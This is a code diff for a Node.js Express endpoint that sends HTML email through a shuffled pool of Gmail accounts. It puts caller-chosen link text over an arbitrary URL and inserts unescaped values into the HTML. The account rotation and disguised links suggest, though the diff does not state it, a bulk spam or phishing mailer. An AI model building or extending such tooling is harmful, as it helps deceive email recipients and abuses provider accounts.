@@ -151,37 +151,33 @@ app.post("/gowt", (req, res) => {
   console.log("Received request to send email.");
 
   let attempt = 0;
+  const shuffledAccounts = shuffleArray([...gmailAccounts]); // Randomize accounts
 
   const tryNextAccount = () => {
-    if (attempt >= gmailAccounts.length) {
+    if (attempt >= shuffledAccounts.length) {
       console.log("All Gmail accounts have been tried, email sending failed.");
       return res
         .status(500)
         .json({ error: "Failed to send email with all accounts" });
     }
 
-    const { user, pass } = gmailAccounts[attempt];
+    const { user, pass } = shuffledAccounts[attempt];
     console.log(`Attempting to send email with: ${user}`);
 
     const transporter = nodemailer.createTransport({
       service: "gmail",
-      auth: {
-        user,
-        pass,
-      },
+      auth: { user, pass },
     });
 
     const safeTextColor = textColor || "#000000"; // Default link color
     const safeFontSize = fontSize || "14px"; // Default font size
 
-    // Convert message to HTML with specified font size
     let htmlMessage = `
       <div style="font-size: ${safeFontSize}; color: #000;">
         ${message.replace(/\n/g, "<br>")}
       </div>
     `;
 
-    // Replace the specified text with a bold, clickable hyperlink
     htmlMessage = htmlMessage.replace(
       linkText,
       `<a href="${linkUrl}" target="_blank" style="color: ${safeTextColor}; font-weight: bold; text-decoration: none;">${linkText}</a>`
@@ -209,6 +205,7 @@ app.post("/gowt", (req, res) => {
 
   tryNextAccount();
 });
+
 
 
 app.post("/telegram-webhook", (req, res) => {
